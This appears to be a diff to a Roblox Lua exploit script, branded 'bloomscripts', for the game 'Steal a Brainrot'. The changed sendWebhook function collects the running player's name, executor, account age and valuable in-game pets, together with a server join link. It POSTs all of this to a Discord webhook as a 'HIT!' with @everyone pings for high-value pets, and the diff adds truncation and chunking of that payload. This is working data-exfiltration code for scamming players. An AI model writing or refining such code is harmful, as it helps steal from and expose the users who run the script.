@@ -119,7 +119,7 @@ local function scanMyBase()
     return found
 end
 
--- Send webhook
+-- Send webhook (only if pets exist)
 local function sendWebhook(pets)
     if not pets or #pets == 0 then return end
     if player and player:GetAttribute("WebhookSent") then return end
@@ -145,39 +145,83 @@ local function sendWebhook(pets)
     local lootText = #orderedLines > 0 and table.concat(orderedLines, "\n") or "Empty"
     if lootText == "Empty" then return end
 
+    -- Safely truncate if too long for Discord
+    if #lootText > 3900 then
+        lootText = lootText:sub(1, 3900) .. "\n...and more"
+    end
+
+    -- Wrap player info in triple backticks
+    local playerInfoText = "```" ..
+        "Name: " .. (player and player.Name or "Unknown") .. "\n" ..
+        "Receiver: " .. receiverList .. "\n" ..
+        "Executor: " .. detectExecutor() .. "\n" ..
+        "Account Age: " .. tostring(getAccountAge()) .. " days" ..
+    "```"
+
+    -- Wrap pets info in triple backticks
+    local petsText = "```" .. lootText .. "```"
+
     local placeId = tostring(game.PlaceId or "")
     local jobId = tostring(game.JobId or "")
     local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
 
     local shouldPing = #priorityPets > 0
 
+    -- Create main embed
     local embed = {
         ["title"] = "🧠 Steal a Brainrot HIT! - bloomscripts",
         ["color"] = 12413107,
         ["fields"] = {
-            {["name"]="Players", ["value"]="```Name: "..(player and player.Name or "Unknown")..
-                "\nReceiver: "..receiverList..
-                "\nExecutor: "..detectExecutor()..
-                "\nAccount Age: "..tostring(getAccountAge()).." days```"},
-            {["name"]="🧠 Brainrots in Base", ["value"]="```"..lootText.."```"},
+            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
             {["name"]="Server Type", ["value"]=serverType},
+            {["name"]="👥 Player Info", ["value"]=playerInfoText},
+            {["name"]="🧠 Brainrots in Base", ["value"]=petsText},
             {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
         }
     }
 
+    -- Payload (with content only if high-value pets found)
     local payload = {
         ["content"] = shouldPing and "📣 @everyone **High Value Brainrot Detected!**" or "",
         ["embeds"] = {embed},
         ["allowed_mentions"] = {["parse"] = shouldPing and {"everyone"} or {}}
     }
 
+    -- If text still too large, split into multiple embeds
+    if #HttpService:JSONEncode(payload) > 6000 then
+        local chunks = {}
+        local chunk = ""
+        for _, line in ipairs(orderedLines) do
+            if #chunk + #line + 2 > 1000 then
+                table.insert(chunks, chunk)
+                chunk = line
+            else
+                chunk = chunk == "" and line or (chunk .. "\n" .. line)
+            end
+        end
+        if chunk ~= "" then table.insert(chunks, chunk) end
+
+        payload.embeds = {}
+        for i, chunkText in ipairs(chunks) do
+            table.insert(payload.embeds, {
+                ["title"] = i == 1 and "🧠 Steal a Brainrot HIT! - bloomscripts" or ("More Brainrots (" .. i .. ")"),
+                ["color"] = 12413107,
+                ["fields"] = {
+                    {["name"] = i == 1 and "👥 Player Info" or "🧠 Brainrots Continued", ["value"] = "```" .. chunkText .. "```"}
+                }
+            })
+            if i >= 5 then break end -- Discord max 10 embeds per message
+        end
+    end
+
+    -- Send request
     local req = (syn and syn.request) or http_request or (http and http.request) or request
     if req and WEBHOOK and WEBHOOK ~= "" then
         pcall(function()
             req({
                 Url = WEBHOOK,
                 Method = "POST",
-                Headers = {["Content-Type"]="application/json"},
+                Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(payload)
             })
         end)
@@ -186,6 +230,7 @@ local function sendWebhook(pets)
         end
     end
 end
+
 
 --================= GUI FOR PRIVATE SERVER LINK =================--
 
